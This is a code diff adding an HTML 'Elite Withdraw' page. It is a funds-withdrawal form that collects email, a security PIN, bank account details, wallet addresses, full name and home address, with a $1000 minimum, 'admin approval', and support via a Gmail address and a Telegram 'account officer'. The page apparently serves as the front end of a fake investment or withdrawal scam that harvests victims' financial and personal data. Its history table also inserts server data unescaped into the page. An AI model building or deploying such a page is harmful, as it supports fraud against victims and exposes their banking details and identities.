@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Elite Withdraw</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
+<style>
+body{margin:0;background:#0d0d0d;font-family:Poppins;color:white;}
+.container{width:900px;margin:40px auto;}
+.card{background:#151515;padding:25px;border-radius:15px;box-shadow:0 0 25px rgba(255,215,0,0.2);margin-bottom:25px;}
+h1{color:gold;}
+label{display:block;margin-top:12px;}
+input,select{width:100%;padding:12px;margin-top:5px;border:none;border-radius:8px;}
+button{margin-top:20px;width:100%;padding:14px;background:gold;border:none;border-radius:10px;font-weight:bold;cursor:pointer;}
+button:hover{background:#e6c200;}
+table{width:100%;margin-top:20px;border-collapse:collapse;}
+th,td{padding:12px;text-align:left;}
+th{background:black;color:gold;}
+tr:nth-child(even){background:#1c1c1c;}
+.badge{padding:5px 10px;border-radius:8px;}
+.pending{background:orange;color:black;}
+.approved{background:green;}
+</style>
+</head>
+<body>
+
+<div class="container">
+<div class="card">
+<h1>Withdraw Funds</h1>
+
+<form action="/withdraw" method="POST" onsubmit="return validateForm()">
+<label>Your Email</label>
+<input type="email" name="email" id="email" required>
+
+<label>Security PIN</label>
+<input type="password" name="pin" id="pin" required placeholder="4-6 digit PIN">
+
+<label>Withdrawal Method</label>
+<select name="method" id="method" onchange="showFields()" required>
+<option value="">Select method</option>
+<option>Wire Transfer</option>
+<option>Cash App</option>
+<option>PayPal</option>
+<option>Zelle</option>
+<option>Cheque</option>
+<option>Crypto</option>
+<option>Cash (Mail Home)</option>
+</select>
+
+<div id="extra"></div>
+
+<label>Amount ($)</label>
+<input type="number" name="amount" id="amount" min="1000" required>
+
+<button>Submit Withdraw Request</button>
+</form>
+
+<p>After submitting, wait for admin approval.</p>
+<p>Support: customerservice@gmail.com</p>
+<p>Telegram: @AccountOfficer</p>
+</div>
+
+<div class="card">
+<h2>Withdraw History</h2>
+<table>
+<thead>
+<tr><th>Method</th><th>Amount</th><th>Status</th><th>Date</th></tr>
+</thead>
+<tbody id="history"></tbody>
+</table>
+</div>
+
+</div>
+
+<script>
+function showFields(){
+ const m=document.getElementById("method").value;
+ const box=document.getElementById("extra");
+ box.innerHTML="";
+ if(m==="Wire Transfer"){
+   box.innerHTML=`<label>Full Name</label><input type="text" name="details" placeholder="Full Name" required>
+   <label>Bank Name & Info</label><input type="text" name="details" placeholder="Bank Name & Account Info" required>
+   <label>Home Address</label><input type="text" name="details" placeholder="Home Address" required>`;
+ }
+ else if(m==="Cash App"){
+   box.innerHTML=`<label>Full Name</label><input type="text" name="details" placeholder="Full Name" required>
+   <label>Email</label><input type="email" name="details" placeholder="Email" required>
+   <label>Cash Tag</label><input type="text" name="details" placeholder="$CashTag" required>`;
+ }
+ else if(m==="PayPal"){
+   box.innerHTML=`<label>Full Name</label><input type="text" name="details" placeholder="Full Name" required>
+   <label>Email</label><input type="email" name="details" placeholder="Email" required>
+   <label>PayPal Address</label><input type="text" name="details" placeholder="PayPal Address" required>`;
+ }
+ else if(m==="Zelle"){
+   box.innerHTML=`<label>Full Name</label><input type="text" name="details" placeholder="Full Name" required>
+   <label>Bank Name</label><input type="text" name="details" placeholder="Bank Name" required>
+   <label>Email</label><input type="email" name="details" placeholder="Email" required>
+   <label>Zelle Info</label><input type="text" name="details" placeholder="Zelle Info" required>`;
+ }
+ else if(m==="Cheque"){
+   box.innerHTML=`<label>Full Name</label><input type="text" name="details" placeholder="Full Name" required>
+   <label>Home Address</label><input type="text" name="details" placeholder="Home Address" required>
+   <p>Follow instructions provided by admin.</p>`;
+ }
+ else if(m==="Crypto"){
+   box.innerHTML=`<label>Crypto Type (BTC/ETH/USDT)</label>
+   <input type="text" name="details" placeholder="BTC/ETH/USDT" required>
+   <label>Wallet Address</label><input type="text" name="details" placeholder="Wallet Address" required>
+   <label>Email</label><input type="email" name="details" placeholder="Your Email" required>`;
+ }
+ else if(m==="Cash (Mail Home)"){
+   box.innerHTML=`<label>Full Name</label><input type="text" name="details" placeholder="Full Name" required>
+   <label>Home Address</label><input type="text" name="details" placeholder="Home Address" required>`;
+ }
+}
+
+function validateForm(){
+ const pin=document.getElementById("pin").value;
+ if(pin.length<4){ alert("Enter valid 4-6 digit PIN"); return false;}
+ return true;
+}
+
+// Load withdraw history
+fetch("/history")
+.then(r=>r.json())
+.then(data=>{
+ let html="";
+ data.forEach(d=>{
+   html+=`<tr><td>${d.method}</td><td>$${d.amount}</td>
+   <td><span class="badge ${d.status=='Pending'?'pending':'approved'}">${d.status}</span></td>
+   <td>${d.date}</td></tr>`;
+ });
+ document.getElementById("history").innerHTML=html;
+});
+</script>
+</body>
+</html>
